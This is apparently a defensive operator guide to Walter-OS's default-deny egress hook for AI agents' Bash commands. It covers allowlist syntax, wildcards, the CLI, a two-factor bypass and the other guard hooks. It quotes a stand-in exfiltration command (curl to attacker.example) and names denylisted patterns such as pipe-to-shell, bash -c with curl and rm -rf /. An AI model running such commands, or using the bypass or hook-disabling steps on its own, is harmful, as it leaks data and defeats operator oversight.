# Network egress allowlist — operator guide

> **Status**: shipped in v0.5.1+ via OSS Trust epic A-2 (#122).
> **Spec**: [`docs/specs/network-egress-allowlist.md`](../specs/network-egress-allowlist.md).

Walter-OS ships a **default-deny** network egress gate. Without explicit
opt-in, every outbound network call made by an agent-issued Bash command
is blocked at the PreToolUse layer.

This guide is the operator's reference for managing the allowlist.

## Why default-deny

The pre-existing PreToolUse chain caught RCE patterns
(`bash-denylist.sh`) and destructive operations (`approval-gate.sh`),
but said nothing about `curl https://attacker.example/exfil`. A
prompt-injection that smuggled a novel exfil command past those gates
had unconstrained network access.

`hooks/network-gate.sh` adds the WHERE layer: agents may reach a
documented set of operator-approved hosts; everything else returns
`network-gate: <host> not in egress allowlist`.

The gate is **command-string parsing**, not connection-layer
enforcement. It catches the 95% case (agent invokes a known network
CLI with the host on the command line). Connection-layer enforcement
(deny-by-default netns, pf/nftables) is OSS Trust A-3 (process
isolation), tracked separately.

## File format

The allowlist lives at `~/.config/walter-os/egress-allowlist.txt`
(or `$WALTER_CONFIG/egress-allowlist.txt`, if you've overridden
`WALTER_CONFIG`).

```
# One host per line. Comments start with `#`. Blanks ignored.
api.github.com
github.com

# Single-label wildcards. `*` does NOT cross dots:
#   *.openrouter.ai matches `api.openrouter.ai` and `auth.openrouter.ai`
#                   but NOT `openrouter.ai` (apex)
#                   and  NOT `a.b.openrouter.ai` (two-deep).
*.openrouter.ai

# Multi-level wildcards require an explicit additional pattern.
*.*.openrouter.ai
```

### Wildcard semantics (D-5)

| Pattern | `openrouter.ai` | `api.openrouter.ai` | `a.b.openrouter.ai` |
|---|:---:|:---:|:---:|
| `openrouter.ai`     | match  | no     | no     |
| `*.openrouter.ai`   | no     | match  | no     |
| `*.*.openrouter.ai` | no     | no     | match  |

The loader splits both pattern and host on `.` into labels and matches
position-by-position. `*` matches one label and never crosses a dot.
This is the safer choice for an allowlist — it prevents over-broad
rules that accidentally allow more than the operator intended.

A bare `*` is **not** a catch-all. To bypass the gate for a one-off
emergency, use the two-factor bypass below.

## Common workflows

### First install

`install.sh` prompts on first install (TTY only) to import the bundled
example. Decline with `n` if you'd rather curate the list yourself
from scratch; you'll get a hint with the manual import command.

The bundled example is at:

```
${WALTER_OS_HOME}/contexts/_examples/egress-allowlist.example.txt
```

### Import the bundled defaults later

```bash
walter-os egress import \
  "${WALTER_OS_HOME}/contexts/_examples/egress-allowlist.example.txt"
```

The import command runs `envsubst` over the file. Lines that reference
unset `${VAR}` are **skipped with a WARN on stderr** — they're not
silently expanded to empty strings (which would produce bogus hosts
like `llm.` / `secrets.`). Set the variable and re-import to pick them
up.

### Add a one-off host

```bash
walter-os egress add api.heygen.com
```

Idempotent — adding twice doesn't duplicate the line.

### Remove a host

```bash
walter-os egress remove api.heygen.com
```

Idempotent — removing a host that's not in the file is a no-op.

### Check the current allowlist

```bash
walter-os egress list
```

### Test whether a host is allowed (without making a request)

```bash
walter-os egress test api.github.com
# → "allowed: api.github.com" (exit 0)

walter-os egress test evil.example
# → "denied: evil.example" (exit 1)
```

`test` does NOT do a DNS lookup. It's a pure pattern-match against the
file, so you can run it offline or in CI.

## Bypass — two-factor (D-6)

If you genuinely need to make a one-off call to a host you haven't
allowlisted (e.g. emergency health check during an incident), both of
the following must be present:

1. The env var `WALTER_EGRESS_ALLOW_OVERRIDE=1` (operator-set,
   out-of-band of the agent).
2. The literal token `--allow-egress-outbound` in the command line
   (operator types it).

```bash
WALTER_EGRESS_ALLOW_OVERRIDE=1 \
  curl https://emergency.example/healthcheck --allow-egress-outbound
```

The hook emits an `allow` decision with a `systemMessage` WARN so the
bypass is visible to the operator (and any audit consumer).

Either signal alone is rejected. A command containing
`--allow-egress-outbound` without the env var is blocked. A command
without the flag is blocked even if the env var is set. This matches
the same pattern `hooks/bash-denylist.sh` uses for its bypass.

## What the hook actually inspects

The hook is INVOKED on every `Bash` tool call. It splits the command
into segments by shell separators (`;`, `&&`, `||`, `|`, `&`) and
inspects each one.

| CLI | Host extraction | Notes |
|---|---|---|
| `curl`, `wget` | URL host token | Fail-CLOSED if no URL token present |
| `git clone\|fetch\|pull\|push\|ls-remote\|archive\|remote\|submodule\|cherry` | URL host or `user@host:` | `git status`/`log`/`diff` etc. pass through |
| `gh` | `${GH_HOST:-github.com}` | Implicit host |
| `ssh` | First non-flag positional, with awareness of value-taking flags (`-i`, `-p`, `-o`, …) | `user@host` form supported |
| `scp`, `rsync` | `user@host:path`, `host:path`, or `rsync://host/...` | |
| `nc`, `ncat`, `netcat` | First non-flag positional | |
| `pip`, `pip3`, `npm`, `pnpm`, `yarn`, `uv`, `uvx`, `cargo`, `brew`, `gem`, `go` | Explicit URL token if present | Otherwise fail-CLOSED (their default registry lives in config/env we don't see) |

Local-only Git operations (`status`, `log`, `diff`, `add`, `commit`,
`rev-parse`, `config`, …) pass through. You can still run `git status`
inside a tight allowlist.

## When pip / npm / cargo block you

These tools read their default registry from config files
(`~/.pip/pip.conf`, `~/.npmrc`, `Cargo.toml`, …) or env vars. The
hook can't see that, so a bare `pip install requests` is **blocked**:

```
network-gate: 'pip' uses an implicit host (config/env). Explicitly
pass --index-url / --registry / equivalent host argument, OR
allowlist the default host and re-run with
WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound.
```

You have three options:

1. **Pass the index explicitly**:
   `pip install --index-url https://pypi.org/simple requests`.
   The hook now sees `pypi.org` and checks the allowlist.
2. **Bypass for this one call** (two-factor):
   `WALTER_EGRESS_ALLOW_OVERRIDE=1 pip install requests --allow-egress-outbound`.
3. **Wrap the call in your `direnv` / project-level env** that sets
   `PIP_INDEX_URL=https://pypi.org/simple` (or your mirror) and pass
   the URL on the command line via a wrapper.

The bundled example allowlists `pypi.org`, `files.pythonhosted.org`,
`registry.npmjs.org` already. The blocker is the COMMAND-LINE host
visibility, not the destination host being missing from the file.

## Composition with the other PreToolUse hooks

The Bash PreToolUse chain runs five hooks. ALL must allow before a
command runs.

1. **`bash-denylist.sh`** — cheap regex match (WHAT — pipe-to-shell,
   `eval $VAR`, `bash -c "$(curl ...)"`, `rm -rf /`).
2. **`approval-gate.sh`** — tier-based approval matrix (WHAT —
   destructive ops, pushes, merges).
3. **`network-gate.sh`** — default-deny egress (WHERE — allowed hosts).
4. **`branch-flow-guard.sh`** — push target policy (`single-tier` vs
   `three-stage` branch flow).
5. **`pre-commit-tests.sh`** — runs tests + lint + typecheck on
   commits.

The order matters for performance: bash-denylist is the cheapest fail-
fast; approval-gate consults YAML; network-gate sources the loader
and parses the command. branch-flow-guard only matters for pushes
that already passed the network check.

`approval-gate` and `network-gate` are independent — neither calls the
other. The hook contract is "all hooks must allow", so they compose
by both being in the chain.

## Audit integration

The daily supply-chain audit (`walter-os audit`) snapshots the SHA256
of the allowlist file. Drift between runs is reported as a finding.
A future enhancement (#122 A-2 follow-up) will add a
`check_egress_allowlist()` probe that:

- WARNs if the file is empty (every call blocked — probably a misconfig).
- HIGHs if a host in the allowlist resolves to a private IP
  (10/8, 192.168/16, etc.) — rebinding risk.

## Troubleshooting

### "I added a host but it's still blocked"

Check three things:

1. The file is at `$WALTER_CONFIG/egress-allowlist.txt` (default:
   `~/.config/walter-os/egress-allowlist.txt`). `walter-os egress list`
   shows the resolved path.
2. The hook gets the same `$WALTER_CONFIG` your shell does. In a
   non-default setup, export it before launching Claude Code.
3. The host you typed matches the URL the CLI uses. `curl
   https://api.github.com` checks `api.github.com`, NOT `github.com`.

### "The hook is blocking a legitimate command I can't avoid"

Either:

- Add the host to the allowlist (`walter-os egress add <host>`).
- Use the two-factor bypass for a one-off.
- Open an issue if the CLI you're using extracts the host in a way
  the parser misses — we'd rather expand the parser than have you
  rely on the bypass.

### "How do I turn the hook off entirely for a session?"

The hook is registered in `~/.claude/settings.json` PreToolUse Bash
chain. To disable temporarily, use `walter-os disable-hook
network-gate` (re-enable with `walter-os enable-hook network-gate`).

We do **not** recommend disabling the hook as a long-term posture.
The whole point of default-deny is that you have to think about every
new outbound destination — that's the security signal.

## Related

- Spec: [`docs/specs/network-egress-allowlist.md`](../specs/network-egress-allowlist.md)
- Parent epic: [`#122` OSS Trust roadmap](https://github.com/Xipher-Labs/walter-os/issues/122)
- Composes with: [`hooks/approval-gate.sh`](../../hooks/approval-gate.sh),
  [`hooks/bash-denylist.sh`](../../hooks/bash-denylist.sh)
- Loader: [`scripts/walter/lib/egress-loader.sh`](../../scripts/walter/lib/egress-loader.sh)
- CLI: [`bin/walter-os`](../../bin/walter-os) (`egress` subcommand)
